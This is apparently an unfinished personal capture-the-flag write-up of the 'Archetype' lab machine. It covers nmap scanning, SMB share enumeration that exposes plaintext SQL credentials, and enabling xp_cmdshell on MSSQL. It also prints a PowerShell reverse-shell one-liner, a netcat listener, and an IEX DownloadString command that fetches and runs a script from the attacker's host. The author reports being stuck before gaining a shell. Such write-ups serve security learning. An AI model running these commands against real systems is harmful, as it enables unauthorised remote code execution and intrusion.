# Archetype
## Starting point - nmap
```shell
$sudo nmap -v -sC -sV -oA nmap/archetype -p- 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-29 13:37 CEST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:37
Completed NSE at 13:37, 0.00s elapsed
Initiating NSE at 13:37
Completed NSE at 13:37, 0.00s elapsed
Initiating NSE at 13:37
Completed NSE at 13:37, 0.00s elapsed
Initiating Ping Scan at 13:37
Scanning 10.10.10.27 [4 ports]
Completed Ping Scan at 13:37, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:37
Completed Parallel DNS resolution of 1 host. at 13:37, 13.05s elapsed
Initiating SYN Stealth Scan at 13:37
Scanning 10.10.10.27 [65535 ports]
Discovered open port 445/tcp on 10.10.10.27
Discovered open port 139/tcp on 10.10.10.27
Discovered open port 135/tcp on 10.10.10.27
Discovered open port 49665/tcp on 10.10.10.27
Discovered open port 47001/tcp on 10.10.10.27
Discovered open port 49666/tcp on 10.10.10.27
Discovered open port 1433/tcp on 10.10.10.27
Discovered open port 5985/tcp on 10.10.10.27
Discovered open port 49664/tcp on 10.10.10.27
Discovered open port 49667/tcp on 10.10.10.27
Discovered open port 49669/tcp on 10.10.10.27
Discovered open port 49668/tcp on 10.10.10.27
Completed SYN Stealth Scan at 13:38, 34.09s elapsed (65535 total ports)
Initiating Service scan at 13:38
Scanning 12 services on 10.10.10.27
Service scan Timing: About 58.33% done; ETC: 13:39 (0:00:39 remaining)
Completed Service scan at 13:39, 54.29s elapsed (12 services on 1 host)
NSE: Script scanning 10.10.10.27.
Initiating NSE at 13:39
Completed NSE at 13:39, 9.63s elapsed
Initiating NSE at 13:39
Completed NSE at 13:39, 0.15s elapsed
Initiating NSE at 13:39
Completed NSE at 13:39, 0.00s elapsed
Nmap scan report for 10.10.10.27
Host is up (0.034s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-03-29T11:31:56
| Not valid after:  2051-03-29T11:31:56
| MD5:   8813 0e55 c918 8776 d3d7 ca96 ea36 08d7
|_SHA-1: d0b2 f6ae c66b ebc1 b4d5 011c 8456 315d fa92 7695
|_ssl-date: 2021-03-29T11:57:01+00:00; +17m38s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h41m37s, deviation: 3h07m50s, median: 17m37s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-29T04:56:54-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-29T11:56:55
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 13:39
Completed NSE at 13:39, 0.00s elapsed
Initiating NSE at 13:39
Completed NSE at 13:39, 0.00s elapsed
Initiating NSE at 13:39
Completed NSE at 13:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.71 seconds
           Raw packets sent: 65975 (2.903MB) | Rcvd: 65536 (2.621MB)


```

- [Port 445](https://www.journaldunet.com/solutions/dsi/1092165-le-cout-de-la-cybercriminalite-explose/1092168-port-et-pirate) is associated with [SMB](https://docs.microsoft.com/fr-fr/troubleshoot/windows-server/networking/smb-sharing-not-accessible-when-tcp-port-445-listen)
- Port 1433 is associated with [MSSQLServer](https://docs.microsoft.com/fr-fr/sql/database-engine/configure-windows/configure-a-server-to-listen-on-a-specific-tcp-port?view=sql-server-ver15)

## First entry - SMB

[Documentation](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)

`smbclient` ftp-like client to access SMB/CIFS resources on servers

`-L` This option allows you to look at what services are available on a server. You use it as `smbclient -L host` and a list should appear.

```shell
$smbclient -L //10.10.10.27
Enter WORKGROUP\kevin's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

backups?

```shell
$smbclient //10.10.10.27/backups/
Enter WORKGROUP\kevin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

		10328063 blocks of size 4096. 8260002 blocks available
```

[`.dtsConfiig`](https://fileinfo.com/extension/dtsconfig)

`get <remote file name> [local file name]` Copy the file called `remote file name` from the server to the machine running the client. If specified, name the local copy `local file name`.

```shell
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (4,3 KiloBytes/sec) (average 4,3 KiloBytes/sec)
smb: \> ^C
$cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

We found the ID & Password for the MSSQLServer:
```text
Password=M3g4c0rp123;
User ID=ARCHETYPE\sql_svc
```

## Second entry - MSSQLServer

Looking for a light mssql client [impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py).

TODO: `locate mssqlclient.py` -> `cp <Path> ./` or `curl -O -L https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py`

```shell
$chmod +x ./mssqlclient.py
$./mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> select is_srvrolemember('sysadmin');
              

-----------   

          1   
```

How to execute shell with MSSQLServer? [xp_cmdshell](https://docs.microsoft.com/fr-fr/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)

```shell
SQL> xp_cmdshell "whoami";
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

Blocked :( let's reconfigure: [sp_configure](https://docs.microsoft.com/fr-fr/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15)

```shell
SQL> EXEC sp_configure 'show advanced option', '1';
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
SQL> EXEC sp_configure;
name                                      minimum       maximum   config_value     run_value   

-----------------------------------   -----------   -----------   ------------   -----------   

access check cache bucket count                 0         65536              0             0   

access check cache quota                        0    2147483647              0             0   

Ad Hoc Distributed Queries                      0             1              0             0   

affinity I/O mask                     -2147483648    2147483647              0             0   

affinity mask                         -2147483648    2147483647              0             0   

affinity64 I/O mask                   -2147483648    2147483647              0             0   

affinity64 mask                       -2147483648    2147483647              0             0   

Agent XPs                                       0             1              0             0   

allow polybase export                           0             1              0             0   

allow updates                                   0             1              0             0   

automatic soft-NUMA disabled                    0             1              0             0   

backup checksum default                         0             1              0             0   

backup compression default                      0             1              0             0   

blocked process threshold (s)                   0         86400              0             0   

c2 audit mode                                   0             1              0             0   

clr enabled                                     0             1              0             0   

clr strict security                             0             1              1             1   

contained database authentication               0             1              0             0   

cost threshold for parallelism                  0         32767              5             5   

cross db ownership chaining                     0             1              0             0   

cursor threshold                               -1    2147483647             -1            -1   

Database Mail XPs                               0             1              0             0   

default full-text language                      0    2147483647           1033          1033   

default language                                0          9999              0             0   

default trace enabled                           0             1              1             1   

disallow results from triggers                  0             1              0             0   

external scripts enabled                        0             1              0             0   

filestream access level                         0             2              0             0   

fill factor (%)                                 0           100              0             0   

ft crawl bandwidth (max)                        0         32767            100           100   

ft crawl bandwidth (min)                        0         32767              0             0   

ft notify bandwidth (max)                       0         32767            100           100   

ft notify bandwidth (min)                       0         32767              0             0   

hadoop connectivity                             0             7              0             0   

index create memory (KB)                      704    2147483647              0             0   

in-doubt xact resolution                        0             2              0             0   

lightweight pooling                             0             1              0             0   

locks                                        5000    2147483647              0             0   

max degree of parallelism                       0         32767              0             0   

max full-text crawl range                       0           256              4             4   

max server memory (MB)                        128    2147483647     2147483647    2147483647   

max text repl size (B)                         -1    2147483647          65536         65536   

max worker threads                            128         65535              0             0   

media retention                                 0           365              0             0   

min memory per query (KB)                     512    2147483647           1024          1024   

min server memory (MB)                          0    2147483647              0            16   

nested triggers                                 0             1              1             1   

network packet size (B)                       512         32767           4096          4096   

Ole Automation Procedures                       0             1              0             0   

open objects                                    0    2147483647              0             0   

optimize for ad hoc workloads                   0             1              0             0   

PH timeout (s)                                  1          3600             60            60   

polybase network encryption                     0             1              1             1   

precompute rank                                 0             1              0             0   

priority boost                                  0             1              0             0   

query governor cost limit                       0    2147483647              0             0   

query wait (s)                                 -1    2147483647             -1            -1   

recovery interval (min)                         0         32767              0             0   

remote access                                   0             1              1             1   

remote admin connections                        0             1              0             0   

remote data archive                             0             1              0             0   

remote login timeout (s)                        0    2147483647             10            10   

remote proc trans                               0             1              0             0   

remote query timeout (s)                        0    2147483647            600           600   

Replication XPs                                 0             1              0             0   

scan for startup procs                          0             1              0             0   

server trigger recursion                        0             1              1             1   

set working set size                            0             1              0             0   

show advanced options                           0             1              1             1   

SMO and DMO XPs                                 0             1              1             1   

transform noise words                           0             1              0             0   

two digit year cutoff                        1753          9999           2049          2049   

user connections                                0         32767              0             0   

user options                                    0         32767              0             0   

xp_cmdshell                                     0             1              0             0   

SQL> EXEC sp_configure 'xp_cmdshell', '1';
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL                                                                               

SQL> 
```

Now it's reverse shell time! [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)

Let's create [`shell.ps1`](https://docs.microsoft.com/fr-fr/powershell/scripting/windows-powershell/ise/how-to-write-and-run-scripts-in-the-windows-powershell-ise?view=powershell-7.1) (replace `10.0.0.1` with my IP)
```shell
$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',9001);$stream = $client.GetStream();\[byte\[\]\]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Let's run a small server (in new terms).
```shell
$sudo python3 -m http.server 80
```

And [listen](https://explainshell.com/explain?cmd=nc+-lvnp+9001)
```shell
$sudo nc -lvnp 9001
```

Let's get a shell
```shell
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.0.0.1/shell.ps1\");"
```

Currently stuck here :/

## We are IN
User flag: ?

## I got the power
Root flag: ?
